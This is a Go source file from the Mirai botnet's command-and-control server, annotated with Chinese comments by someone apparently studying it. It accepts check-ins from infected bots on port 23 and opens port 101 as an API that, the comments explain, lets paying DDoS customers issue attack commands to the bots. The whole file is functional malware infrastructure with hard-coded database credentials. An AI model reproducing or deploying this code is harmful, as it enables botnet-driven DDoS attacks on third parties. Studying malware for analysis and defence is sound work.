package main

import (
	"errors"
	"fmt"
	"net"
	"time"
)

//程序入口，开启23端口和101端口的监听

//c&c控制服务器【管理和控制代码】
const DatabaseAddr string = "127.0.0.1"
const DatabaseUser string = "root"
const DatabasePass string = "password"
const DatabaseTable string = "mirai"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable) //建立本地数据库mirai

func main() {
	tel, err := net.Listen("tcp", "0.0.0.0:23") //23用来处理 telnet 登录【是招募的bot payload连接这个端口】
	if err != nil {
		fmt.Println(err)
		return
	}

	api, err := net.Listen("tcp", "0.0.0.0:101") //101用作 API 处理。【应该是作为租售服务，对外开放的API接口】
	if err != nil {
		fmt.Println(err)
		return
	}

	go func() {
		for { //注意是for循环，会不断接收请求，然后用协程处理用户请求，马上由进入accept状态，等待下一个用户接入。
			conn, err := api.Accept() //对101绑定端口进行accept，交由apiHandler处理
			if err != nil {
				break
			}
			go apiHandler(conn) //处理mirai DDoS攻击购买用户的接入连接，解析用户的攻击命令，发动管辖的bot进行攻击。
		}
	}()

	for {
		conn, err := tel.Accept() //对23绑定端口进行accept【mirai bot建立好后，会连接这个23号telnet端口，等待攻击指令。】
		if err != nil {
			break
		}
		go initialHandler(conn)
	}

	fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second)) //设置10s后作为ddl，解析conn发来的数据

	buf := make([]byte, 32)
	l, err := conn.Read(buf) //读取conn中的数据到buf中
	if err != nil || l <= 0 {
		return
	}
	//这一段代码应该是对应着mirai的bot/main.c的代码（292行的位置）
	//mirai bot payload应该会先发送\x00\x00\x00\x01
	//然后发送id_len和id_buf
	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1) //读取一字节的数据，也就是说接收的字符长度不超过256
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0]) //设置接收buffer的长度为string_len[0]
				l, err := conn.Read(source_buf)           //读取string_len[0]长度的buffer数据
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			//增加bot，记录\x01和source信息（应该就是bot main函数运行时的argv[0]）
			NewBot(conn, buf[3], source).Handle() //也就是conn记录了和bot 23端口建立的连接，buf[3]为\x01也就是version 1的bot版本。
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		NewAdmin(conn).Handle() //否则只记录conn连接，并且调用Handle函数
	}
}

func apiHandler(conn net.Conn) {
	defer conn.Close()

	NewApi(conn).Handle() //进入api.go中的Handle函数进行处理
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
